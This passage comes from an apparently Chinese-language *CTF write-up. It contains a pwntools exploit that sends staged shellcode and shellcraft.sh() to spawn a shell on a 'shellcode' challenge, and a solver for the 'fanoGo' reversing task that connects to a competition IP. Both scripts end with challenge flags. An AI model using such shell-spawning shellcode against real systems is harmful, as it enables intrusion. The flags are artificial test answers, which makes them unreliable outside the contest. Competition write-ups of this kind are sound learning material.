<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">10002</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">host</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">'./shellcode'</span><span class="p">)</span>
        <span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s1">'''</span>
<span class="s1">            b *0x00000000004008CB</span>
<span class="s1">            c</span>
<span class="s1">        '''</span><span class="p">)</span>
    <span class="n">sc</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">'''</span>
<span class="s1">        pop rdx</span>
<span class="s1">        pop rdi</span>
<span class="s1">        pop rdi</span>
<span class="s1">        pop rdi</span>
<span class="s1">        pop rdi</span>
<span class="s1">        pop rdi</span>
<span class="s1">        pop rdi</span>
<span class="s1">        pop rdi</span>
<span class="s1">        pop rdi</span>
<span class="s1">        pop rdi</span>
<span class="s1">        syscall</span>
<span class="s1">    '''</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">'plz:'</span><span class="p">,</span> <span class="n">sc</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">'</span><span class="se">\x90</span><span class="s1">'</span><span class="o">*</span><span class="mh">0x100</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">sh</span><span class="p">()))</span>
    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">exploit</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="s1">'REMOTE'</span><span class="p">])</span>

<span class="c1"># *CTF{LtMh5VbedHlngmKOS2cwWRo4AkDGzCBy}</span>
</pre></div>
<h2 data-content="1" id="38e4b52bf31336352ac73231e2994b2f">RE</h2>
<h3 data-content="1" id="accc22ee73708b9632cae3eff013582a">fanoGo</h3>
<p>程序逻辑：以corpus.txt的内容作为table，要求将输入经过fano.(*Fano).Decode后等于<br/>
<code>If you cannot read all your books...fondle them---peer into them, let them fall open where they will, read from the first sentence that arrests the eye, set them back on the shelves with your own hands, arrange them on your own plan so that you at least know where they are. Let them be your friends; let them, at any rate, be your acquaintances.</code></p>
<p>直接复用程序中的fano.(*Fano).Encode，将上面的数据编码得到密文</p>
<div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">os</span><span class="o">=</span><span class="s1">'linux'</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="s1">'amd64'</span><span class="p">)</span>

<span class="c1"># p = process('./fanoGo')</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">'34.92.37.22'</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>

<span class="n">ans</span> <span class="o">=</span> <span class="p">[</span>
<span class="mh">0x82c2b7c2bec3602b</span><span class="p">,</span>
<span class="mh">0x2a87c25b95c389c2</span><span class="p">,</span>
<span class="mh">0x6fbdc35196c21369</span><span class="p">,</span>
<span class="mh">0x94c27492c35a2832</span><span class="p">,</span>
<span class="mh">0xa4c296c295c294c2</span><span class="p">,</span>
<span class="mh">0xb3c28ec3a3c28ac3</span><span class="p">,</span>
<span class="mh">0x46aec2bac2242424</span><span class="p">,</span>
<span class="mh">0x2332abc33cacc22b</span><span class="p">,</span>
<span class="mh">0xc3acc2b3c3b0c32a</span><span class="p">,</span>
<span class="mh">0xc26ba3c22c87c285</span><span class="p">,</span>
<span class="mh">0xc3a8c25c87c30fad</span><span class="p">,</span>
<span class="mh">0x12b9c3a1c3afc2b3</span><span class="p">,</span>
<span class="mh">0x91c2a6c272448ac3</span><span class="p">,</span>
<span class="mh">0x676451a7c3316d66</span><span class="p">,</span>
<span class="mh">0x5191c296c26b7578</span><span class="p">,</span>
<span class="mh">0x7b578ec3133ea7c3</span><span class="p">,</span>
<span class="mh">0xc311297f459dc247</span><span class="p">,</span>
<span class="mh">0x8ac259a7c3a1c395</span><span class="p">,</span>
<span class="mh">0xfb5c291c28cc206</span><span class="p">,</span>
<span class="mh">0xc38bc3bac28ec23a</span><span class="p">,</span>
<span class="mh">0x718ec2bcc3a8c3aa</span><span class="p">,</span>
<span class="mh">0x42b9c336326fbdc3</span><span class="p">,</span>
<span class="mh">0xc3792292c349a7c3</span><span class="p">,</span>
<span class="mh">0x6396c3795493c389</span><span class="p">,</span>
<span class="mh">0x6f23b3c396c31f6a</span><span class="p">,</span>
<span class="mh">0x76a8c394c23794c2</span><span class="p">,</span>
<span class="mh">0xadc23f7c8ec383c3</span><span class="p">,</span>
<span class="mh">0x7baac20c9fc2a0c3</span><span class="p">,</span>
<span class="mh">0x7eb0c3adc22683c3</span><span class="p">,</span>
<span class="mh">0x97f9dc247a5c33a</span><span class="p">,</span>
<span class="mh">0xafc2b0c24449a5c3</span><span class="p">,</span>
<span class="mh">0xbdc351508cc33a0f</span><span class="p">,</span>
<span class="mh">0x49272d8cc32c326f</span><span class="p">,</span>
<span class="mh">0xc2b3c3b0c32aa3c3</span><span class="p">,</span>
<span class="mh">0xc2b0c389c288c3ac</span><span class="p">,</span>
<span class="mh">0x4111299fc21c7e9d</span><span class="p">,</span>
<span class="mh">0xc288c3bcc2b5c347</span><span class="p">,</span>
<span class="mh">0xb8c2a2c3b0c3389a</span><span class="p">,</span>
<span class="mh">0x5092c315a9c3</span><span class="p">,</span>
<span class="p">]</span>

<span class="c1"># gdb.attach(p, '''</span>
<span class="c1"># b *0x000000000045C4F0</span>
<span class="c1"># # command</span>
<span class="c1"># # set $rip=0x000000000045C970</span>
<span class="c1"># # fin</span>
<span class="c1"># # end</span>
<span class="c1"># c</span>
<span class="c1"># ''')</span>

<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s1">':'</span><span class="p">,</span> <span class="n">flat</span><span class="p">(</span><span class="n">ans</span><span class="p">)[:</span><span class="mh">0x136</span><span class="p">])</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>

<span class="c1"># *CTF{NUY4a3E5D9186hVzejoyItr7xHBcmOpv}</span>
</pre></div>
</div>
</div>